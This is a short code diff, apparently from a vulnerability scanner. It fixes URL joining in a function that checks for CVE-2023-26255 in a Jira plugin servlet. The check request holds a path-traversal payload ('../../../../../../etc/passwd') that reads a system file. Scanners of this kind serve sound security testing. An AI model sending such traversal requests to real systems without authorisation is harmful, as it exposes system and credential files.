@@ -14,7 +14,7 @@ def check_cve_2023_26255(url):
     '''
     Checks for CVE-2023-26255
     '''
-    check_cve_2023_26255_url = f"{url}plugins/servlet/snjCustomDesignConfig?fileName=../../../../../../etc/passwd&fileMime=$textMime"
+    check_cve_2023_26255_url = f"{url.rstrip('/')}/plugins/servlet/snjCustomDesignConfig?fileName=../../../../../../etc/passwd&fileMime=$textMime"
     vulnerabilities = ''
 
     try:
